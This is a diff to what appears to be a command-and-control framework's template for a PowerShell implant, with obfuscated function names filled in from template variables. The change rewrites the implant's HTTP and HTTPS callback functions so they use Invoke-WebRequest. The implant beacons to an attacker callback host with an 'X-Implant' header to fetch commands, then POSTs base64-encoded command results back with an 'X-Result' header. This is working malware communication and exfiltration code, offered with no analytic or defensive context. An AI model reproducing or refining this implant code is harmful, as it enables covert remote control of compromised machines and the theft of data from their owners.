@@ -150,67 +150,36 @@ function {{ ron.obf_builtin_command }}($data){
 function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
     if ( ${{ ron.obf_callback_reason }} -eq 0 ){
         $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
+        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
+        $Script:headers = $r.Content
+
     } else {
         $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/help"
+        $enc = [system.Text.Encoding]::UTF8
+        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
+        $data2 = $script:command_id+$data2
+        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
+        $Script:headers = $r.Content
     }
-    $enc = [system.Text.Encoding]::UTF8
-    $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
-    $kk = [System.Net.WebRequest]::Create($URL);
-    $kk.Method = "POST"
-    if ( ${{ ron.obf_callback_reason }} -eq 0){
-        $kk.Headers.Add("X-Implant","{{ uii }}")
-    } else {
-        $kk.Headers.Add("X-Result","{{ uii }}")
-        $data2 = $script:command_id+$data2  
-    }
-    $kk.ContentLength = $data2.Length
-    $kk.KeepAlive = $false;
-    $kk.Timeout = 10000;
-    $kk.SendChunked = $true;
-    $requestStream = $kk.GetRequestStream()
-    $requestStream.Write($enc.GetBytes($data2), 0, $data2.Length)
-    $requestStream.Flush()
-    $resp = $kk.GetResponse()
-    $reqstream = $resp.GetResponseStream()
-    $sr = new-object System.IO.StreamReader $reqstream
-    $result  = $sr.ReadtoEnd()
-    $Script:headers = $result
-    $kk.close()
-}    
-
+}
 '''
 
     https_function = '''
 function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
     if ( ${{ ron.obf_callback_reason }} -eq 0 ){
         $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
+        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
+        $Script:headers = $r.Content
+
     } else {
         $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
+        $enc = [system.Text.Encoding]::UTF8
+        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
+        $data2 = $script:command_id+$data2
+        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
+        $Script:headers = $r.Content
     }
-    $enc = [system.Text.Encoding]::UTF8
-    $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
-    $kk = [System.Net.WebRequest]::Create($URL);
-    $kk.Method = "POST"
-    if ( ${{ ron.obf_callback_reason }} -eq 0){
-        $kk.Headers.Add("X-Implant","{{ uii }}")
-    } else {
-        $data2 = $Script:command_id+$data2
-        $kk.Headers.Add("X-Result","{{ uii }}")
-    }
-    $kk.ContentLength = $data2.Length
-    $kk.KeepAlive = $false;
-    $kk.Timeout = 10000;
-    $kk.SendChunked = $true;
-    $requestStream = $kk.GetRequestStream()
-    $requestStream.Write($enc.GetBytes($data2), 0, $data2.Length)
-    $requestStream.Flush()
-    $resp = $kk.GetResponse()
-    $reqstream = $resp.GetResponseStream()
-    $sr = new-object System.IO.StreamReader $reqstream
-    $result  = $sr.ReadtoEnd()
-    $Script:headers = $result
-    $kk.close()
-}    
+}
 '''
 
     select_protocol = '''
